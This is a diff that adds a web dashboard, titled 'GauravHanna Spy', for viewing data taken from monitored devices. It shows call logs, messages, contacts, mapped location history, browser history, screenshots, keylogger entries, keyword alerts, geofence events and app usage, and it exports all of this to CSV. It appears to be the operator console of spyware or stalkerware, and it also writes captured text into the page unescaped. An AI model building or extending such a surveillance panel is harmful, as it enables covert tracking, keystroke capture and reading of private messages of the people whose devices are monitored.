@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GauravHanna Spy - Dashboard</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    /* CSS styles (same as earlier but expanded) */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Inter', sans-serif; background: #f4f7fc; }
+    .sidebar { position: fixed; left: 0; top: 0; width: 260px; height: 100%; background: #0f172a; color: white; padding: 20px; overflow-y: auto; z-index: 100; }
+    .sidebar .logo { font-size: 24px; font-weight: bold; margin-bottom: 30px; }
+    .sidebar .logo i { color: #1e88e5; }
+    .sidebar ul { list-style: none; }
+    .sidebar li { margin: 8px 0; }
+    .sidebar a { color: #cbd5e1; text-decoration: none; display: flex; align-items: center; gap: 12px; padding: 10px; border-radius: 12px; transition: 0.2s; font-size: 14px; }
+    .sidebar a:hover, .sidebar a.active { background: #1e293b; color: white; }
+    .main-content { margin-left: 260px; padding: 20px; }
+    .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; background: white; padding: 15px 25px; border-radius: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
+    .dashboard-card { background: white; border-radius: 24px; padding: 20px; margin-bottom: 25px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+    .card-title { font-size: 20px; font-weight: 600; margin-bottom: 20px; border-left: 4px solid #1e88e5; padding-left: 12px; }
+    .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 20px; margin-bottom: 30px; }
+    .stat-box { background: #f8fafc; padding: 20px; border-radius: 20px; text-align: center; }
+    .stat-number { font-size: 32px; font-weight: 800; color: #1e88e5; }
+    .table-responsive { overflow-x: auto; }
+    table { width: 100%; border-collapse: collapse; }
+    th, td { padding: 12px; text-align: left; border-bottom: 1px solid #e2e8f0; }
+    th { background: #f1f5f9; font-weight: 600; }
+    .tab-content { display: none; }
+    .tab-content.active { display: block; }
+    .btn-outline { background: none; border: 1px solid #1e88e5; padding: 6px 16px; border-radius: 20px; cursor: pointer; }
+    .btn-primary { background: #1e88e5; color: white; border: none; padding: 8px 20px; border-radius: 30px; cursor: pointer; }
+    img.screenshot-thumb { max-width: 100px; max-height: 100px; border-radius: 8px; }
+    #map { height: 400px; border-radius: 20px; margin-bottom: 20px; }
+    @media (max-width: 768px) { .sidebar { width: 70px; } .sidebar a span { display: none; } .main-content { margin-left: 70px; } }
+  </style>
+</head>
+<body>
+  <div class="sidebar">
+    <div class="logo"><i class="fas fa-eye"></i><span> GauravHanna_Spy</span></div>
+    <ul>
+      <li><a href="#" data-tab="dashboard"><i class="fas fa-tachometer-alt"></i><span> Dashboard</span></a></li>
+      <li><a href="#" data-tab="calls"><i class="fas fa-phone"></i><span> Calls</span></a></li>
+      <li><a href="#" data-tab="messages"><i class="fas fa-envelope"></i><span> Messages</span></a></li>
+      <li><a href="#" data-tab="contacts"><i class="fas fa-address-book"></i><span> Contacts</span></a></li>
+      <li><a href="#" data-tab="locations"><i class="fas fa-map-marker-alt"></i><span> Locations</span></a></li>
+      <li><a href="#" data-tab="browser"><i class="fas fa-globe"></i><span> Browser History</span></a></li>
+      <li><a href="#" data-tab="screenshots"><i class="fas fa-camera"></i><span> Screenshots</span></a></li>
+      <li><a href="#" data-tab="keylogs"><i class="fas fa-keyboard"></i><span> Keylogger</span></a></li>
+      <li><a href="#" data-tab="keywords"><i class="fas fa-tags"></i><span> Keyword Alerts</span></a></li>
+      <li><a href="#" data-tab="geofence"><i class="fas fa-draw-polygon"></i><span> Geofence</span></a></li>
+      <li><a href="#" data-tab="appusage"><i class="fas fa-chart-simple"></i><span> App Usage</span></a></li>
+      <li><a href="#" data-tab="export"><i class="fas fa-download"></i><span> Export Data</span></a></li>
+    </ul>
+  </div>
+  <div class="main-content">
+    <div class="top-bar">
+      <h2>Welcome, <span id="userName">User</span></h2>
+      <button id="logoutBtn" class="btn-outline"><i class="fas fa-sign-out-alt"></i> Logout</button>
+    </div>
+
+    <!-- Dashboard Tab -->
+    <div id="dashboard" class="tab-content active">
+      <div class="dashboard-card">
+        <div class="card-title">Statistics</div>
+        <div class="stats-grid" id="statsGrid"></div>
+      </div>
+      <div class="dashboard-card">
+        <div class="card-title">Recent Activity</div>
+        <div id="recentActivity"></div>
+      </div>
+    </div>
+
+    <!-- Calls Tab -->
+    <div id="calls" class="tab-content"><div class="dashboard-card"><div class="card-title">Call Logs</div><div class="table-responsive"><table id="callsTable"><thead><tr><th>Contact</th><th>Number</th><th>Type</th><th>Duration</th><th>Time</th></tr></thead><tbody></tbody></table></div></div></div>
+    <div id="messages" class="tab-content"><div class="dashboard-card"><div class="card-title">Messages</div><div class="table-responsive"><table id="messagesTable"><thead><tr><th>App</th><th>Contact</th><th>Message</th><th>Time</th></tr></thead><tbody></tbody></table></div></div></div>
+    <div id="contacts" class="tab-content"><div class="dashboard-card"><div class="card-title">Contacts</div><div class="table-responsive"><table id="contactsTable"><thead><tr><th>Name</th><th>Number</th><th>Email</th></tr></thead><tbody></tbody></table></div></div></div>
+    <div id="locations" class="tab-content"><div class="dashboard-card"><div class="card-title">Location History</div><div id="map"></div><div class="table-responsive"><table id="locationsTable"><thead><tr><th>Address</th><th>Lat/Lng</th><th>Time</th></tr></thead><tbody></tbody></table></div></div></div>
+    <div id="browser" class="tab-content"><div class="dashboard-card"><div class="card-title">Browser History</div><div class="table-responsive"><table id="browserTable"><thead><tr><th>URL</th><th>Title</th><th>Visit Time</th><th>Frequency</th></tr></thead><tbody></tbody></table></div></div></div>
+    <div id="screenshots" class="tab-content"><div class="dashboard-card"><div class="card-title">Screenshots</div><div id="screenshotsGrid" style="display: flex; flex-wrap: wrap; gap: 15px;"></div></div></div>
+    <div id="keylogs" class="tab-content"><div class="dashboard-card"><div class="card-title">Keylogger Entries</div><div class="table-responsive"><table id="keylogsTable"><thead><tr><th>App</th><th>Text</th><th>Time</th></tr></thead><tbody></tbody></table></div></div></div>
+    <div id="keywords" class="tab-content"><div class="dashboard-card"><div class="card-title">Keyword Alerts</div><div class="table-responsive"><table id="keywordsTable"><thead><tr><th>Keyword</th><th>Matched Text</th><th>App</th><th>Time</th></tr></thead><tbody></tbody></table></div></div></div>
+    <div id="geofence" class="tab-content"><div class="dashboard-card"><div class="card-title">Geofence Events</div><div class="table-responsive"><table id="geofenceTable"><thead><tr><th>Fence Name</th><th>Event</th><th>Center</th><th>Radius</th><th>Time</th></tr></thead><tbody></tbody></table></div></div></div>
+    <div id="appusage" class="tab-content"><div class="dashboard-card"><div class="card-title">App Usage</div><div class="table-responsive"><table id="appusageTable"><thead><tr><th>App Name</th><th>Package</th><th>Foreground Time (sec)</th><th>Time</th></tr></thead><tbody></tbody></table></div></div></div>
+    <div id="export" class="tab-content"><div class="dashboard-card"><div class="card-title">Export Data</div><button id="exportBtn" class="btn-primary">Export All as CSV</button></div></div>
+  </div>
+
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <script>
+    // Dashboard JavaScript
+    const API_BASE = 'http://localhost:5000/api';
+    let token = localStorage.getItem('token');
+    if (!token) window.location.href = 'login.html';
+
+    // Helper fetch
+    async function fetchAPI(endpoint) {
+      const res = await fetch(`${API_BASE}${endpoint}`, {
+        headers: { 'Authorization': `Bearer ${token}` }
+      });
+      return res.json();
+    }
+
+    // Load user info
+    async function loadUser() {
+      const data = await fetchAPI('/auth/me');
+      if (data.success) document.getElementById('userName').innerText = data.user.name;
+    }
+
+    // Load dashboard stats and recent
+    async function loadDashboard() {
+      const stats = await fetchAPI('/data/stats');
+      if (stats.success) {
+        const s = stats.stats;
+        document.getElementById('statsGrid').innerHTML = `
+          <div class="stat-box"><div class="stat-number">${s.totalDevices}</div><div>Devices</div></div>
+          <div class="stat-box"><div class="stat-number">${s.totalMessages}</div><div>Messages</div></div>
+          <div class="stat-box"><div class="stat-number">${s.totalCalls}</div><div>Calls</div></div>
+          <div class="stat-box"><div class="stat-number">${s.totalLocations}</div><div>Locations</div></div>
+          <div class="stat-box"><div class="stat-number">${s.totalScreenshots}</div><div>Screenshots</div></div>
+        `;
+      }
+      const recent = await fetchAPI('/data/recent');
+      if (recent.success && recent.data.length) {
+        let html = '<div class="table-responsive"><table><thead><tr><th>Type</th><th>Details</th><th>Time</th></tr></thead><tbody>';
+        recent.data.slice(0, 20).forEach(item => {
+          let details = '';
+          if (item.contactName) details = `${item.callType || ''} call with ${item.contactName}`;
+          else if (item.message) details = `Message: ${item.message.substring(0, 50)}`;
+          else if (item.address) details = `Location: ${item.address}`;
+          else if (item.text) details = `Keylog: ${item.text.substring(0, 50)}`;
+          html += `<tr><td>${item.constructor.modelName}</td><td>${details}</td><td>${new Date(item.timestamp).toLocaleString()}</td></tr>`;
+        });
+        html += '</tbody></table></div>';
+        document.getElementById('recentActivity').innerHTML = html;
+      } else {
+        document.getElementById('recentActivity').innerHTML = '<p>No recent activity</p>';
+      }
+    }
+
+    // Load calls
+    async function loadCalls() {
+      const res = await fetchAPI('/data/calls');
+      if (res.success) {
+        const tbody = document.querySelector('#callsTable tbody');
+        tbody.innerHTML = '';
+        res.data.forEach(call => {
+          const row = `<tr>
+            <td>${call.contactName || ''}</td>
+            <td>${call.phoneNumber}</td>
+            <td>${call.callType}</td>
+            <td>${call.duration}s</td>
+            <td>${new Date(call.timestamp).toLocaleString()}</td>
+          </tr>`;
+          tbody.insertAdjacentHTML('beforeend', row);
+        });
+      }
+    }
+
+    // Load messages
+    async function loadMessages() {
+      const res = await fetchAPI('/data/messages');
+      if (res.success) {
+        const tbody = document.querySelector('#messagesTable tbody');
+        tbody.innerHTML = '';
+        res.data.forEach(msg => {
+          const row = `<tr>
+            <td>${msg.app}</td>
+            <td>${msg.contactName || msg.contactNumber}</td>
+            <td>${msg.message}</td>
+            <td>${new Date(msg.timestamp).toLocaleString()}</td>
+          </tr>`;
+          tbody.insertAdjacentHTML('beforeend', row);
+        });
+      }
+    }
+
+    // Load contacts
+    async function loadContacts() {
+      const res = await fetchAPI('/data/contacts');
+      if (res.success) {
+        const tbody = document.querySelector('#contactsTable tbody');
+        tbody.innerHTML = '';
+        res.data.forEach(contact => {
+          const row = `<tr><td>${contact.name}</td><td>${contact.number}</td><td>${contact.email || ''}</td></tr>`;
+          tbody.insertAdjacentHTML('beforeend', row);
+        });
+      }
+    }
+
+    // Load locations and show map
+    let map;
+    async function loadLocations() {
+      const res = await fetchAPI('/data/locations');
+      if (res.success && res.data.length) {
+        const tbody = document.querySelector('#locationsTable tbody');
+        tbody.innerHTML = '';
+        // Initialize map
+        if (!map) {
+          map = L.map('map').setView([res.data[0].lat, res.data[0].lng], 12);
+          L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OpenStreetMap' }).addTo(map);
+        }
+        res.data.forEach(loc => {
+          const row = `<tr><td>${loc.address || ''}</td><td>${loc.lat}, ${loc.lng}</td><td>${new Date(loc.timestamp).toLocaleString()}</td></tr>`;
+          tbody.insertAdjacentHTML('beforeend', row);
+          L.marker([loc.lat, loc.lng]).addTo(map).bindPopup(loc.address || 'Location');
+        });
+        // Fit bounds
+        if (res.data.length > 1) {
+          const bounds = res.data.map(p => [p.lat, p.lng]);
+          map.fitBounds(bounds);
+        }
+      }
+    }
+
+    // Load browser history
+    async function loadBrowser() {
+      const res = await fetchAPI('/data/browser');
+      if (res.success) {
+        const tbody = document.querySelector('#browserTable tbody');
+        tbody.innerHTML = '';
+        res.data.forEach(hist => {
+          const row = `<tr><td><a href="${hist.url}" target="_blank">${hist.url}</a></td><td>${hist.title}</td><td>${new Date(hist.visitTime).toLocaleString()}</td><td>${hist.frequency}</td></tr>`;
+          tbody.insertAdjacentHTML('beforeend', row);
+        });
+      }
+    }
+
+    // Load screenshots
+    async function loadScreenshots() {
+      const res = await fetchAPI('/data/screenshots');
+      if (res.success) {
+        const grid = document.getElementById('screenshotsGrid');
+        grid.innerHTML = '';
+        res.data.forEach(shot => {
+          const img = document.createElement('img');
+          img.src = shot.imageBase64;
+          img.classList.add('screenshot-thumb');
+          img.style.maxWidth = '150px';
+          img.style.borderRadius = '8px';
+          const div = document.createElement('div');
+          div.appendChild(img);
+          div.innerHTML += `<br><small>${new Date(shot.timestamp).toLocaleString()}</small>`;
+          grid.appendChild(div);
+        });
+      }
+    }
+
+    // Load keylogs
+    async function loadKeylogs() {
+      const res = await fetchAPI('/data/keylogs');
+      if (res.success) {
+        const tbody = document.querySelector('#keylogsTable tbody');
+        tbody.innerHTML = '';
+        res.data.forEach(log => {
+          const row = `<tr><td>${log.appPackage}</td><td>${log.text}</td><td>${new Date(log.timestamp).toLocaleString()}</td></tr>`;
+          tbody.insertAdjacentHTML('beforeend', row);
+        });
+      }
+    }
+
+    // Load keyword alerts
+    async function loadKeywords() {
+      const res = await fetchAPI('/data/keyword-alerts');
+      if (res.success) {
+        const tbody = document.querySelector('#keywordsTable tbody');
+        tbody.innerHTML = '';
+        res.data.forEach(alert => {
+          const row = `<tr><td>${alert.keyword}</td><td>${alert.matchedText}</td><td>${alert.app}</td><td>${new Date(alert.timestamp).toLocaleString()}</td></tr>`;
+          tbody.insertAdjacentHTML('beforeend', row);
+        });
+      }
+    }
+
+    // Load geofence events
+    async function loadGeofence() {
+      const res = await fetchAPI('/data/geofence');
+      if (res.success) {
+        const tbody = document.querySelector('#geofenceTable tbody');
+        tbody.innerHTML = '';
+        res.data.forEach(ev => {
+          const row = `<tr><td>${ev.name}</td><td>${ev.triggerEvent}</td><td>${ev.centerLat}, ${ev.centerLng}</td><td>${ev.radius}m</td><td>${new Date(ev.timestamp).toLocaleString()}</td></tr>`;
+          tbody.insertAdjacentHTML('beforeend', row);
+        });
+      }
+    }
+
+    // Load app usage
+    async function loadAppUsage() {
+      const res = await fetchAPI('/data/app-usage');
+      if (res.success) {
+        const tbody = document.querySelector('#appusageTable tbody');
+        tbody.innerHTML = '';
+        res.data.forEach(usage => {
+          const row = `<tr><td>${usage.appName}</td><td>${usage.appPackage}</td><td>${usage.foregroundTime}</td><td>${new Date(usage.timestamp).toLocaleString()}</td></tr>`;
+          tbody.insertAdjacentHTML('beforeend', row);
+        });
+      }
+    }
+
+    // Export all data as CSV
+    async function exportData() {
+      const endpoints = ['calls', 'messages', 'contacts', 'locations', 'browser', 'keylogs', 'keyword-alerts', 'geofence', 'app-usage'];
+      let allData = [];
+      for (let ep of endpoints) {
+        const res = await fetchAPI(`/data/${ep}`);
+        if (res.success) {
+          allData.push({ type: ep, data: res.data });
+        }
+      }
+      // Convert to CSV
+      let csvRows = [];
+      allData.forEach(section => {
+        csvRows.push(`\n\n--- ${section.type} ---\n`);
+        if (section.data.length) {
+          const headers = Object.keys(section.data[0]);
+          csvRows.push(headers.join(','));
+          section.data.forEach(row => {
+            const values = headers.map(h => JSON.stringify(row[h] || ''));
+            csvRows.push(values.join(','));
+          });
+        } else {
+          csvRows.push('No data');
+        }
+      });
+      const blob = new Blob([csvRows.join('\n')], { type: 'text/csv' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = 'monitoring_export.csv';
+      a.click();
+      URL.revokeObjectURL(url);
+    }
+
+    // Tab switching
+    const tabs = document.querySelectorAll('.sidebar a');
+    const contents = document.querySelectorAll('.tab-content');
+    tabs.forEach(link => {
+      link.addEventListener('click', (e) => {
+        e.preventDefault();
+        const tabId = link.getAttribute('data-tab');
+        contents.forEach(content => content.classList.remove('active'));
+        document.getElementById(tabId).classList.add('active');
+        tabs.forEach(t => t.classList.remove('active'));
+        link.classList.add('active');
+        // Load data for this tab
+        switch(tabId) {
+          case 'dashboard': loadDashboard(); break;
+          case 'calls': loadCalls(); break;
+          case 'messages': loadMessages(); break;
+          case 'contacts': loadContacts(); break;
+          case 'locations': loadLocations(); break;
+          case 'browser': loadBrowser(); break;
+          case 'screenshots': loadScreenshots(); break;
+          case 'keylogs': loadKeylogs(); break;
+          case 'keywords': loadKeywords(); break;
+          case 'geofence': loadGeofence(); break;
+          case 'appusage': loadAppUsage(); break;
+          case 'export': document.getElementById('exportBtn').onclick = exportData; break;
+        }
+      });
+    });
+
+    // Logout
+    document.getElementById('logoutBtn').addEventListener('click', () => {
+      localStorage.removeItem('token');
+      window.location.href = 'login.html';
+    });
+
+    // Initial load
+    loadUser();
+    loadDashboard();
+  </script>
+</body>
+</html>
